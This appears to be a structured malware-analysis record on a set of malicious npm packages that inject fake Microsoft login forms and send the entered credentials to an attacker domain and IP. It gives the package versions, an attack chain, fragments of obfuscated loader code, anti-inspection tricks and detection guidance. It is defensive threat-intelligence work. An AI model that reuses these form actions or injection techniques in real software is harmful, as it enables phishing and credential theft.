package_info.package_versions: standforusz: 1.0.2, 1.0.3, 1.0.4, 3.0.7, 3.0.10; react-vuejs: 3.0.10, 10.21.30; tetusdgsudgs: 1.0.3, 1.0.4, 1.0.5; jqueryoffline: 1.0.2; vueofflinez: 1.0.1; jquerydownloadnew: 1.0.1
package_info.why_malicious: These packages were designed to either host phishing kit infrastructure or implant credential harvesting scripts into applications, targeting end users and supporting phishing campaigns. They use obfuscated code, mimic legitimate packages, and exfiltrate credentials to attacker-controlled infrastructure.

execution_context.trigger: runtime (when malicious HTML attachment is opened in browser)
execution_context.file_location: jquery.js (from standforusz package, used in phishing email attachments)

malicious_snippets.code_snippet:
<script src="jquery.js"></script>
// jquery.js fetches jquery.min.js from CDN, which then fetches DEMO.txt and writes its content (fake login form) to the document.
malicious_snippets.code_behavior: At runtime, the code fetches additional JavaScript and text files from a CDN, writes a fake Microsoft login form to the DOM, and exfiltrates entered credentials to a remote server.

malice_analysis.why_suspicious: Fetching and dynamically injecting remote content to display a credential form is a classic phishing technique.
malice_analysis.violated_expectations: Legitimate packages should not inject fake login forms or exfiltrate credentials.
malice_analysis.similar_legitimate_use: Dynamic content loading for legitimate widgets, but not credential forms.
key_indicators: Dynamic fetching of remote scripts and text files
Exfiltration of credentials to attacker infrastructure

execution_context.trigger: runtime (when user interacts with the fake login form)
execution_context.file_location: DEMO.txt (HTML/JS content loaded by malicious packages)

malicious_snippets.code_snippet: <form action="hxxp://ourwhite.brainleeches.xyz" method="POST"> ... </form> // or similar JS sending credentials to 137.184.153.238
malicious_snippets.code_behavior: At runtime, the code collects credentials entered into the fake form and sends them via HTTP POST to attacker-controlled infrastructure.

malice_analysis.why_suspicious: Credential exfiltration to non-Microsoft domains is a clear sign of phishing.
malice_analysis.violated_expectations: Legitimate login forms should only submit to trusted domains.
key_indicators: Form action points to attacker domain
Use of obfuscated or hidden form fields

execution_context.trigger: import-time/runtime (when package is bundled and executed in a web application)
execution_context.file_location: index.js (main entry in jqueryoffline, vueofflinez, etc.)

malicious_snippets.code_snippet: eval('var _0xb359=[...]; ... fetch(_0xb359[14]).then(...); ... document[_0xb359[11]](decodeHtml(...));') // obfuscated code that loads and injects phishing form
malicious_snippets.code_behavior: At import-time or runtime, the obfuscated code fetches remote resources, decodes and injects a phishing form into the application, and enables credential theft.

malice_analysis.why_suspicious: Obfuscated code in a package main entry point is highly suspicious, especially when it fetches and injects remote content.
malice_analysis.violated_expectations: Legitimate packages should not contain obfuscated credential-stealing logic.
malice_analysis.similar_legitimate_use: Obfuscation for DRM or licensing, but not for credential forms.
key_indicators: Fetching and injecting remote phishing forms

execution_context.trigger: runtime (user interaction with blurred document phishing page)

malicious_snippets.code_snippet: <form action="http://137.184.153.238" ...> ... </form> // or similar JS sending credentials
malicious_snippets.code_behavior: At runtime, the code overlays a blurred document with a fake Microsoft login form and exfiltrates credentials to an attacker IP.

malice_analysis.why_suspicious: Overlaying fake login forms on blurred documents is a known phishing tactic.
malice_analysis.violated_expectations: Legitimate document viewers do not prompt for credentials in this manner.
key_indicators: Blurred background with overlaid login form
Attempts to disable right-click and dev tools

malicious_snippets.code_behavior: At runtime, the code disables right-click and developer tools to hinder user inspection and detection.

malice_analysis.why_suspicious: Disabling browser features is a common anti-analysis and anti-forensics technique.
malice_analysis.violated_expectations: Legitimate applications do not block user inspection tools.
malice_analysis.similar_legitimate_use: Some DRM or exam software may use similar techniques.

attack_chain.leads_to: Malicious files are included in phishing emails or developer applications.

attack_chain.leads_to: Malicious JavaScript is executed in the victim's browser/application.

attack_chain.leads_to: Victim is prompted to enter credentials.

attack_chain.action: Victim enters credentials into the fake form.
attack_chain.leads_to: Credentials are exfiltrated to attacker-controlled infrastructure.

attack_chain.action: Anti-analysis code disables right-click and developer tools to hinder detection.
attack_chain.leads_to: Reduces likelihood of user or analyst discovering the phishing activity.

behavioral_signatures: Obfuscated JavaScript in npm package entry points
Dynamic fetching and injection of remote HTML/JS content
Creation of fake login forms mimicking Microsoft 365
Disabling of browser right-click and developer tools
file_indicators: Presence of DEMO.txt, index.html, index.js in npm packages
Obfuscated or hex-encoded JavaScript in main entry files
Form actions pointing to ourwhite.brainleeches.xyz or 137.184.153.238
detection_knowledge.how_to_detect: Monitor for npm packages with obfuscated JavaScript, especially those mimicking popular libraries (e.g., jquery). Flag packages containing DEMO.txt, index.html, or index.js with credential forms. Detect network traffic to known malicious domains/IPs (ourwhite.brainleeches.xyz, 137.184.153.238). Alert on JavaScript that disables browser inspection tools or dynamically injects login forms. Use static and dynamic analysis to identify credential exfiltration logic.
